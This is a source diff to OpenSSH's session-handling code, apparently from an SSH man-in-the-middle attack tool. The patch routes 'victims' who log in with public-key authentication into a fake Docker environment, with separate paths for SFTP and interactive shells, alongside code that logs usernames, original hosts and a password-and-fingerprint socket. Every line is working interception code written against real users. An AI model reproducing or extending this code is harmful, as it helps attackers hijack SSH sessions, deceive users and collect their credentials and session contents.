@@ -1648,25 +1648,6 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 	signal(SIGPIPE, SIG_DFL);
 
 
-	if (lol->authkey_used) {
-	  char *envp[8] = {0};
-
-	  debug3("Victim used key authentication.  Spawning Docker container...");
-	  argv[0] = DOCKER_CMD;
-	  argv[1] = "run";
-	  argv[2] = "-it";
-	  argv[3] = "--rm";
-	  argv[4] = "ssh-mitm-fake-env";
-	  argv[5] = NULL;
-
-	  envp[0] = "DOCKER_HOST=unix:///home/ssh-mitm/.docker/run/docker.sock";
-	  envp[1] = NULL;
-
-	  execve(argv[0], argv, envp);
-	  logit("MITM: failed to launch Docker container for public key authentication!");
-	  exit(-1);
-	}
-
 	if (s->is_subsystem == SUBSYSTEM_INT_SFTP_ERROR) {
 		printf("This service allows sftp connections only.\n");
 		fflush(NULL);
@@ -1676,6 +1657,28 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 		extern int optind, optreset;
 		int i;
 		char *p, *args;
+
+
+		/* For SFTP with key auth; connects to our Docker container. */
+		if (lol->authkey_used) {
+		  char *envp[8] = {0};
+
+		  debug3("Victim used key authentication for sftp.  Spawning Docker container...");
+		  argv[0] = DOCKER_CMD;
+		  argv[1] = "run";
+		  argv[2] = "-i";
+		  argv[3] = "ssh-mitm-fake-env";
+		  argv[4] = "/usr/lib/openssh/sftp-server";
+		  argv[5] = NULL;
+
+		  envp[0] = "DOCKER_HOST=unix:///home/ssh-mitm/.docker/run/docker.sock";
+		  envp[1] = NULL;
+
+		  execve(argv[0], argv, envp);
+		  logit("MITM: failed to launch Docker container for public key authentication (SFTP)!");
+		  exit(-1);
+		}
+
 
 		/* Hard-code the SFTP server path to our version. */
 		if (command != NULL) {
@@ -1706,6 +1709,25 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 					lol->original_host, lol->original_port,
 #endif
 					lol->username, password_and_fingerprint_socket_name, s->session_log_filepath, s->session_log_dir));
+	}
+
+	if (lol->authkey_used) {
+	  char *envp[8] = {0};
+
+	  debug3("Victim used key authentication for shell.  Spawning Docker container...");
+	  argv[0] = DOCKER_CMD;
+	  argv[1] = "run";
+	  argv[2] = "-it";
+	  argv[3] = "--rm";
+	  argv[4] = "ssh-mitm-fake-env";
+	  argv[5] = NULL;
+
+	  envp[0] = "DOCKER_HOST=unix:///home/ssh-mitm/.docker/run/docker.sock";
+	  envp[1] = NULL;
+
+	  execve(argv[0], argv, envp);
+	  logit("MITM: failed to launch Docker container for public key authentication (shell)!");
+	  exit(-1);
 	}
 
 	fflush(NULL);
